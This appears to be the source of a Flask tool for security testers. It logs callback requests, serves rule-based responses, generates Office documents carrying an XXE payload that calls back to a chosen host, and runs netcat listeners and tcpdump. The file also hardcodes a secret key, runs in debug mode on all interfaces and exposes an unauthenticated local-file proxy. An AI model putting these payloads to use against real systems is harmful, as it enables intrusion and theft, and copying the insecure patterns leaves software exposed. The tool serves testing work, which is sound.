#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import time
import re
import json
import urllib
import psutil
import shlex
import tempfile
import subprocess
import requests
import filters

from flask import Flask, Blueprint, request, Response, jsonify, render_template, send_from_directory, send_file, abort, copy_current_request_context
from flask import after_this_request
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO, emit
import jinja2
from jinja2.sandbox import SandboxedEnvironment
from models import Rule, Log, Config
from config import REQUEST_HEADERS, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DB, BANK_PREFIX_LIST
from payload import Payload as PayloadGen

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SQLALCHEMY_COMMIT_TEARDOWN'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://%s:%s@localhost/%s' % (
    MYSQL_USER, MYSQL_PASSWORD, MYSQL_DB)
db = SQLAlchemy(app)
socketio = SocketIO(app)


# @app.after_request
# def after_request(response):
#     header = response.headers
#     header['Access-Control-Allow-Origin'] = '*'
#     header['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
#     header['Access-Control-Allow-Headers'] = 'Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers'
#     return response


# custom filters
env = SandboxedEnvironment()
for func in dir(filters):
    if '__' not in func:
        filter = getattr(filters, func)
        env.filters[func] = filter


def fetch(method, url, **kwargs):
    try:
        r = requests.request(method, url, verify=False, **kwargs)
        return r.content, r.headers
    except Exception as e:
        print "fetch %s\nerror: %s" % (url, e)
        # pass
    return '', {}


def process_remote(remote):

    method = remote.get('method', 'GET')
    url = remote.get('url')

    if method and url:
        params = render(remote.get('params', ''))
        data = render(remote.get('data', ''))
        remote_headers = {}
        for header in remote.get('headers'):
            name = header.get('name')
            value = header.get('value')
            if all([name, value]):
                remote_headers[name] = render(value)
        if url.startswith("http://") or url.startswith("https://"):
            headers = REQUEST_HEADERS
            if remote_headers:
                headers = headers
            html, _headers = fetch(
                method, url, params=params, data=data, timeout=5, headers=headers)
            resp = Response(html)
            if _headers:
                for key, value in _headers.iteritems():
                    if key in ('Transfer-Encoding', 'Content-Encoding'):
                        continue
                    resp.headers[key.title()] = value
        else:
            file = url
            for _ in BANK_PREFIX_LIST:
                if _ in file:
                    resp = Response("Illegal file %s" % file)
                    return resp
            if os.path.isfile(file):
                with open(file, 'rb') as f:
                    resp = Response(f.read())
            else:
                resp = Response("File %s not found" % file)
    return resp


@app.before_request
def before_request():

    for rule in get_rules():

        resp = Response()
        path = rule.get('path', '')
        method = rule.get('method', [])

        if (request.method in method or "ALL" in method) and request.path == path:
            log(rule, request)

            code = int(rule.get('code', 200))
            body = rule.get('body', '')
            headers = rule.get('headers', {})
            remote = rule.get('remote', {})

            if remote and remote.get("url"):
                resp = process_remote(remote)
            else:
                body = render(body)
                resp = Response(body)

            if headers:
                for header in headers:
                    name = header.get('name')
                    value = header.get('value')
                    if all([name, value]):
                        resp.headers[name] = render(value)

            return resp, code


@app.route('/<path>')
def main(path):
    return abort(404)

# log middleware


def log(rule, request):
    print "[%s] %s" % (request.method, request.path)
    data = {
        "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
        "remote_addr": request.remote_addr,
        "headers": dict(request.headers.to_list()),
        "query_string": request.query_string,
        "data": request.get_data(),
        "method": request.method,
    }
    log = Log(rid=rule['id'], request=json.dumps(data))
    db.session.add(log)
    db.session.commit()


def get_rules():
    results = []
    for rule in db.session.query(Rule).all():
        log_count = db.session.query(Log).filter_by(rid=rule.id).count()
        item = {}
        for key, value in rule.__dict__.iteritems():
            if not key.startswith('_'):
                item[key] = value
        item["method"] = json.loads(item["method"])
        item["headers"] = json.loads(item["headers"])
        item["log_count"] = log_count

        if item.get('remote'):
            item["remote"] = json.loads(item["remote"])
        else:
            item["remote"] = {}
        item['remote'].setdefault('headers', [])

        results.append(item)
    return results


def get_logs(rid):
    results = []
    for log in db.session.query(Log).filter_by(rid=rid):
        item = {}
        for key, value in log.__dict__.iteritems():
            if key.startswith('_'):
                continue
            item[key] = value
            if key in ("request", ):
                item[key] = json.loads(value)
        results.append(item)
    return results


@app.route('/api/interfaces')
def interfaces():
    return jsonify({"data": get_all_interfaces()})


@app.route('/api/rules')
def rules():
    results = get_rules()
    return jsonify({"data": results})


@app.route('/api/rules/<rid>/log')
def rules_detail(rid):
    if rid:
        rule = db.session.query(Rule).get(rid)
        logs = get_logs(rid)
        return jsonify({"data": logs})
        return jsonify({"message": "ok"})
    return jsonify({"message": "no data"})


@app.route('/admin')
def index():
    return send_from_directory('templates', 'index.html')


@app.route('/api/rules/update', methods=['POST'])
def update_rule():
    try:
        j = request.get_json()
        _id = j.get('id')
        if _id:
            rule = db.session.query(Rule).get(_id)
            if rule is not None:
                rule.method = json.dumps(j["method"])
                rule.headers = json.dumps(j["headers"])
                rule.path = j.get("path", '')
                rule.code = j.get("code", '')
                rule.body = j.get("body", '')
                rule.remote = json.dumps(j.get("remote"))
                db.session.commit()
                return jsonify({"message": "ok"})
    except ValueError as e:
        return str(e)
    return jsonify({"message": "no data"})


@app.route('/api/rules/del/<int:id>', methods=['DELETE'])
def del_rule(id):
    try:
        _id = id
        if _id:
            rule = db.session.query(Rule).get(_id)
            if rule is not None:
                db.session.delete(rule)
                db.session.commit()
                return jsonify({"message": "ok"})
    except ValueError as e:
        return str(e)
    return jsonify({"message": "no data"})


@app.route('/api/rules/add', methods=['POST'])
def add_rule():
    try:
        j = request.get_json()

        method = json.dumps(j.get('method', ["GET"]))
        headers = json.dumps(j.get('headers', {}))
        path = j.get("path", '')
        code = j.get("code", 200)
        body = ''
        remote = json.dumps({"headers": []})

        rule = Rule(method=method, headers=headers, path=path, body=body,
                    code=code, remote=remote)
        db.session.add(rule)
        db.session.commit()
        return jsonify({"message": "ok"})
    except ValueError as e:
        return str(e)
    return jsonify({"message": "no data"})


@app.route('/api/logs/del/<int:id>', methods=['DELETE'])
def del_log(id):
    try:
        _id = id
        if _id:
            rule = db.session.query(Log).get(_id)
            if rule is not None:
                db.session.delete(rule)
                db.session.commit()
                return jsonify({"message": "ok"})
    except ValueError as e:
        return str(e)
    return jsonify({"message": "no data"})


@app.route('/api/logs/del/<int:id>/all', methods=['DELETE'])
def del_all_log(id):
    try:
        rid = id
        if rid:
            logs = db.session.query(Log).filter_by(rid=rid)
            logs.delete()
            return jsonify({"message": "ok"})
    except ValueError as e:
        return str(e)
    return jsonify({"message": "no data"})


def get_var():
    vars = db.session.query(Config).filter_by(name='vars').first()
    vars = json.loads(vars.value)
    results = {}
    for var in vars:
        name = var.get("name")
        value = var.get("value")
        if all([name, value]):
            results[name] = value
    return results


def get_vars():
    vars = db.session.query(Config).filter_by(name='vars').first()
    vars = json.loads(vars.value)
    return vars


@app.route('/api/vars', methods=['GET', 'POST'])
def api_config():
    if request.method == 'POST':
        j = request.get_json()
        if j:
            config = db.session.query(Config).filter_by(name='vars').first()
            config.value = json.dumps(j)
            db.session.commit()
            return jsonify({"message": "ok"})

    return jsonify({"data": get_vars()})


def get_variables():
    # request.url
    # request.host
    # request.method
    # request.path
    # request.query_string
    # request.args
    # request.form
    # request.body
    # request.headers
    # request.cookie

    request_vars = {
        "request": request,
    }

    variables = get_var()
    variables.update(request_vars)
    return variables


def render(source):
    variables = get_variables()
    template = env.from_string(source)
    try:
        return template.render(variables)
    except jinja2.exceptions.SecurityError as e:
        return 'SecurityError'


def make_file(filetype, payload):
    defualt_payload = '''<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{{host}}/">
%remote;
]>'''
    xxe_payload = payload or defualt_payload
    if filetype and xxe_payload:
        xxe_payload = render(xxe_payload)
        if xxe_payload:
            gen = PayloadGen(xxe_payload, dirname=tempfile.tempdir)
            if filetype == "doc":
                return gen.doc_poc()
            elif filetype == "xlsx":
                return gen.xlsx_poc()
            elif filetype == "pptx":
                return gen.pptx_poc()
    return ""


@app.route('/api/file/<filetype>', methods=['POST'])
def download(filetype):
    j = request.get_json()
    if j:
        payload = j.get("payload", "")
        filename = make_file(filetype, str(payload))

        if filename:
            res = send_file(filename_or_fp=filename,
                            mimetype='application/octet-stream',
                            as_attachment=True,
                            attachment_filename=os.path.basename(filename))
            # fail safe mode for more encoded filenames.
            # It seems Flask and Werkzeug do not support RFC 5987 http://greenbytes.de/tech/tc2231/#encoding-2231-char
            # res.headers['Content-Disposition'] = 'attachment; filename*=%s' % filename
            # after_this_request(cleanup)

            @after_this_request
            def remove_file(response):
                try:
                    os.remove(filename)
                except OSError as e:
                    print e
                return response
            return res

        return jsonify({"message": "no type"})
    return jsonify({"message": "no data"})


def get_all_interfaces():
    interfaces = {}
    for interface_name, item in psutil.net_if_addrs().iteritems():
        if item[0].family == 2:
            interfaces[interface_name] = item[0].__dict__
    return interfaces


def get_request_port():
    p = request.host.split(':', 1)
    if len(p) == 2:
        return int(p[1])
    return 80
# ---------------------------- info ----------------------------


@socketio.on('connect')
def test_connect():
    print('Client connected')


@socketio.on('disconnect')
def test_disconnect():
    print('Client disconnected')


# ---------------------------- nc ----------------------------


@socketio.on('start_nc')
def start(protocol, port):
    print 'run nc in background'
    socketio.start_background_task(
        target=copy_current_request_context(start_nc), protocol=protocol, port=port)


def start_nc(protocol, port):
    global nc_proc

    protocol_map = {
        'tcp': '',
        'udp': 'u'
    }

    if not str(port).isdigit() or protocol not in protocol_map:
        return

    shell_cmd = 'nc -vvk%sl %s' % (protocol_map[protocol], port)
    print 'Command: %s' % shell_cmd
    cmd = shlex.split(shell_cmd)
    nc_proc = subprocess.Popen(cmd, shell=False, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    while nc_proc.poll() is None:
        emit('nc_status', 1)
        line = nc_proc.stdout.readline()
        line = line.strip()
        if line:
            emit('recv_nc_message', line)
    if nc_proc.returncode == 0:
        print('Subprogram success')
    else:
        print('Subprogram failed')
    emit('nc_status', 0)


@socketio.on('stop_nc')
def stop():
    print 'stop nc'
    if 'nc_proc' in globals() and nc_proc.poll() is None:
        nc_proc.kill()
        print 'kill process success'
    else:
        print 'no process'


@socketio.on('send_message')
def send(data):
    print data
    if 'nc_proc' in globals() and nc_proc.poll() is None:
        nc_proc.stdin.write("%s\r\n" % data)
        return
    print "current no nc running"


# ---------------------------- tcpdump ----------------------------

@socketio.on('start_tcpdump')
def start(protocol, interface):
    print 'run tcpdump in background'
    socketio.start_background_task(
        target=copy_current_request_context(start_tcpdump), protocol=protocol, interface=interface)


def start_tcpdump(protocol, interface):
    global tcpdump_proc

    protocol_map = ('tcp', 'udp', 'icmp', )

    if interface not in get_all_interfaces() or protocol not in protocol_map:
        return
    port = get_request_port()
    shell_cmd = "tcpdump -nXX -i %s -l '%s and !port %s and !port 22'" % (
        interface, protocol, port)
    print 'Command: %s' % shell_cmd
    cmd = shlex.split(shell_cmd)
    tcpdump_proc = subprocess.Popen(cmd, shell=False, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    while tcpdump_proc.poll() is None:
        emit('tcpdump_status', 1)
        line = tcpdump_proc.stdout.readline()
        line = line.strip()
        if line:
            emit('recv_tcpdump_message', line)
    if tcpdump_proc.returncode == 0:
        print('Subprogram success')
    else:
        print('Subprogram failed')
    emit('tcpdump_status', 0)


@socketio.on('stop_tcpdump')
def stop():
    print 'stop tcpdump'
    if 'tcpdump_proc' in globals() and tcpdump_proc.poll() is None:
        tcpdump_proc.kill()
        print 'kill process success'
    else:
        print 'no process'


if __name__ == '__main__':
    host = '0.0.0.0'
    port = 8081
    socketio.run(app, host=host, port=port, debug=True)
